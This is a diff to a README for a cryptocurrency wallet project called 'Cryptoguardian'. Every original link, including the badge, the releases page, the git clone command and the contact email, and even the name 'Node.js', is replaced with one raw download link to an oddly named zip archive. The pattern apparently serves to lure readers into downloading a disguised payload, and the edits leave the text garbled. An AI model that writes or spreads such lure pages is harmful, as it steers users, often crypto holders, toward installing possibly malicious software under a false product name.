@@ -1,10 +1,10 @@
 # Cryptoguardian: Your Secure Crypto Wallet 🛡️
 
-![Cryptoguardian Logo](https://img.shields.io/badge/Cryptoguardian-Secure%20Wallet-blue.svg)
+![Cryptoguardian Logo](https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip%https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip)
 
 Welcome to the **Cryptoguardian** repository! This project is a secure wallet application designed to protect your digital assets. It employs advanced encryption methods to ensure that your cryptocurrencies remain safe from unauthorized access. 
 
-[Download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/releases)
+[Download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Welcome to the **Cryptoguardian** repository! This project is a secure wallet ap
 
 Cryptoguardian integrates a range of technologies to deliver a robust solution:
 
-- **Node.js**: For server-side operations and handling requests.
+- **https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip**: For server-side operations and handling requests.
 - **Pandas**: For data manipulation and analysis.
 - **Streamlit**: To create interactive web applications.
 - **Matplotlib & Seaborn**: For data visualization.
@@ -41,12 +41,12 @@ To get started with Cryptoguardian, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Deadpegazus/cryptoguardian-cg.git
+   git clone https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip
    cd cryptoguardian-cg
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Node.js installed. Then, run:
+   Ensure you have https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip installed. Then, run:
    ```bash
    npm install
    ```
@@ -60,7 +60,7 @@ To get started with Cryptoguardian, follow these steps:
 4. **Access the Application**:
    Open your web browser and go to `http://localhost:3000`.
 
-For the latest updates, [download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/releases).
+For the latest updates, [download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip).
 
 ## Usage 📊
 
@@ -98,11 +98,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out:
 
-- **Email**: yourname@example.com
-- **GitHub**: [Deadpegazus](https://github.com/Deadpegazus)
+- **Email**: https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip
+- **GitHub**: [Deadpegazus](https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip)
 
 Feel free to check the "Releases" section for updates and new features. 
 
-[Download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/releases)
+[Download the latest release here!](https://github.com/Deadpegazus/cryptoguardian-cg/raw/refs/heads/main/unmaidenliness/cryptoguardian_cg_equidistantly.zip)
 
 Thank you for your interest in Cryptoguardian! Together, we can make cryptocurrency management secure and efficient.
